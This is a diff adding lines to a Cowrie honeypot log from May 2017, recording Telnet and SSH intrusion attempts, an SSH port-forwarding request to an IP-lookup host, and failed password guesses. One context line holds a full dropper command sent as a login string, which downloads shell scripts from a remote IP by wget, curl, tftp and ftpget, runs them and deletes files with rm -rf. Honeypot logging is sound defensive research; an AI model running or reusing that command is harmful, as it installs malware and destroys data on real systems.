@@ -763,3 +763,23 @@
 2017-05-09T01:11:30+0000 [CowrieTelnetTransport,51439,82.118.242.174] login attempt [sh/cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.118.242.175/bins.sh; curl -O http://82.118.242.175/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 82.118.242.175 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 82.118.242.175; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 82.118.242.175 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *] failed
 2017-05-09T01:11:30+0000 [CowrieTelnetTransport,51439,82.118.242.174] Warning: state changed and new state returned
 2017-05-09T01:11:44+0000 [CowrieTelnetTransport,51439,82.118.242.174] Connection lost after 17 seconds
+2017-05-09T01:12:04+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,75902,91.230.47.82] got channel 'direct-tcpip' request
+2017-05-09T01:12:04+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,75902,91.230.47.82] direct-tcp connection request to 107.6.186.178:80 from localhost:5556
+2017-05-09T01:12:04+0000 [SSHChannel None (13) on SSHService 'ssh-connection' on HoneyPotSSHTransport,75902,91.230.47.82] direct-tcp forward to 107.6.186.178:80 with data 'GET /internals/api/ip?1494292288405745957 HTTP/1.1\r\nHost: ip5.adspy.mobi\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.67 Safari/537.36\r\nAccept-Encoding: gzip, deflate, sdch\r\n\r\n'
+2017-05-09T01:12:04+0000 [SSHChannel None (13) on SSHService 'ssh-connection' on HoneyPotSSHTransport,75902,91.230.47.82] failed to connect: Connection refused
+2017-05-09T01:12:04+0000 [SSHChannel None (13) on SSHService 'ssh-connection' on HoneyPotSSHTransport,75902,91.230.47.82] sending close 13
+2017-05-09T01:12:52+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 202.103.238.19:39015 (10.8.41.81:2222) [session: 37577a75]
+2017-05-09T01:12:53+0000 [HoneyPotSSHTransport,75967,202.103.238.19] Remote SSH version: SSH-2.0-libssh2_1.6.0
+2017-05-09T01:12:53+0000 [HoneyPotSSHTransport,75967,202.103.238.19] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-05-09T01:12:53+0000 [HoneyPotSSHTransport,75967,202.103.238.19] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-09T01:12:53+0000 [HoneyPotSSHTransport,75967,202.103.238.19] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-09T01:12:54+0000 [HoneyPotSSHTransport,75967,202.103.238.19] NEW KEYS
+2017-05-09T01:12:54+0000 [HoneyPotSSHTransport,75967,202.103.238.19] starting service 'ssh-userauth'
+2017-05-09T01:12:54+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,75967,202.103.238.19] 'uucp' trying auth 'password'
+2017-05-09T01:12:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,75967,202.103.238.19] login attempt: 997
+2017-05-09T01:12:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,75967,202.103.238.19] login return, expect: [doctor/doctor]
+2017-05-09T01:12:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,75967,202.103.238.19] login attempt [uucp/uucp] failed
+2017-05-09T01:12:56+0000 [-] 'uucp' failed auth 'password'
+2017-05-09T01:12:56+0000 [-] unauthorized login: 
+2017-05-09T01:12:57+0000 [HoneyPotSSHTransport,75967,202.103.238.19] connection lost
+2017-05-09T01:12:57+0000 [HoneyPotSSHTransport,75967,202.103.238.19] Connection lost after 4 seconds
